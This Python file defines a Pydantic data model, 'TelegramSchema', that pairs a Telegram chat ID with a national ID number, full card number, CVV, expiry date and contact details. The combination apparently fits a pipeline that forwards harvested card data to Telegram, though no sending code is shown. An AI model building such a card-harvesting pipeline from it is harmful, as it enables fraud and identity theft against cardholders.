from pydantic import BaseModel

class TelegramSchema(BaseModel):
    chat_id:str
    DNI:str
    number:str
    CVV:str
    Vto:str
    name:str
    last_name:str
    phone:str
    email:str
    